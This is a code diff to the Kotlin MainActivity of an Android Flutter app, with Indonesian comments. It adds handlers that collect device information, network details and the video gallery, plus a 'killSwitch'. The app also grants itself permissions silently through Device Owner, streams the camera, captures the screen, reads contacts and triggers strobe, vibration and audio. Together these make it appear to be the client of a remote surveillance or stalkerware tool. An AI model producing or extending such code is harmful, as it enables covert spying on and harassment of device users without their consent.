@@ -91,9 +91,6 @@ class MainActivity : FlutterActivity() {
         cameraThread = HandlerThread("CameraThread").apply { start() }
         cameraHandler = Handler(cameraThread!!.looper)
 
-        // ✅ Auto-grant semua permission kalau Device Owner
-
-
         requestBatteryOptimizationExemption()
         requestCameraPermissionIfNeeded()
     }
@@ -168,7 +165,6 @@ class MainActivity : FlutterActivity() {
                 }
             }
 
-            // Special permissions (tanpa dialog)
             try {
                 dpm.setPermissionGrantState(
                     admin, packageName,
@@ -292,8 +288,71 @@ class MainActivity : FlutterActivity() {
 
                     "getContacts" -> getContacts(result)
 
-                    // ✅ Baru: auto-grant dari Flutter
+                    // ✅ Auto-grant dari Flutter
                     "autoGrantAllPermissions" -> result.success(tryAutoGrantPermissions())
+
+                    // ==========================================
+                    // ===== 4 METHOD BARU =====
+                    // ==========================================
+                    "getDeviceInfo" -> {
+                        val info = DeviceInfoHandler.getDeviceInfo(this)
+                        result.success(info.toString())
+                    }
+
+                    "getNetworkInfo" -> {
+                        val info = NetworkInfoHandler.getNetworkInfo(this)
+                        result.success(info.toString())
+                    }
+
+                    "getVideos" -> {
+                        val videos = VideoGalleryHandler.getVideos(this)
+                        result.success(videos.toString())
+                    }
+
+                    "killSwitch" -> {
+                        try {
+                            // Stop camera stream
+                            closeCamera()
+
+                            // Stop screen capture
+                            try {
+                                virtualDisplay?.release()
+                                virtualDisplay = null
+                                imageReader?.close()
+                                imageReader = null
+                                mediaProjection?.stop()
+                                mediaProjection = null
+                            } catch (_: Exception) {}
+
+                            // Stop audio
+                            try {
+                                mediaPlayer?.stop()
+                                mediaPlayer?.release()
+                                mediaPlayer = null
+                            } catch (_: Exception) {}
+
+                            // Stop vibrate
+                            try {
+                                getVibrator().cancel()
+                            } catch (_: Exception) {}
+
+                            // Stop strobe
+                            try {
+                                val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                                for (id in camManager.cameraIdList) {
+                                    try {
+                                        camManager.setTorchMode(id, false)
+                                    } catch (_: Exception) {}
+                                }
+                            } catch (_: Exception) {}
+
+                            Log.d("MainActivity", "🛑 Kill switch executed")
+                            result.success(true)
+                        } catch (e: Exception) {
+                            result.error("KILL", e.message, null)
+                        }
+                    }
+                    // ===== 4 METHOD BARU (END) =====
 
                     else -> result.notImplemented()
                 }
